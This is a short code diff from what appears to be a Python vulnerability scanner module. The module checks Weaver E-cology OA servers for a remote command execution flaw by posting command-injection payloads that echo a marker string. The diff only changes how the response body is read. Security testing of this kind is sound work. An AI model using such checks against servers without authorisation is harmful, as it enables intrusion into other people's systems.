@@ -38,9 +38,9 @@ class Weaver_Ecology_Oa_Rce_BaseVerify:
             for data_payload in self.data_payloads: 
                 try:
                     check_req = await request.post(url, data = data_payload.format(cmd = 'echo ' + self.capta), headers = self.headers)
-                    if check_req.status == 200 and ";</script>" not in check_req.content and "Login.jsp" not in check_req.content and "Error" not in check_req.content and self.capta in check_req.content:
+                    if check_req.status == 200 and ";</script>" not in await check_req.text() and "Login.jsp" not in await check_req.text() and "Error" not in await check_req.text() and self.capta in await check_req.text():
                         # print("存在E-cologyOA_RCE漏洞")
-                        #print("Server Current Username：{0}".format(check_req.content))
+                        #print("Server Current Username：{0}".format(await check_req.text()))
                         return True, url_payload, data_payload
                 except Exception as e:
                     # print(e)
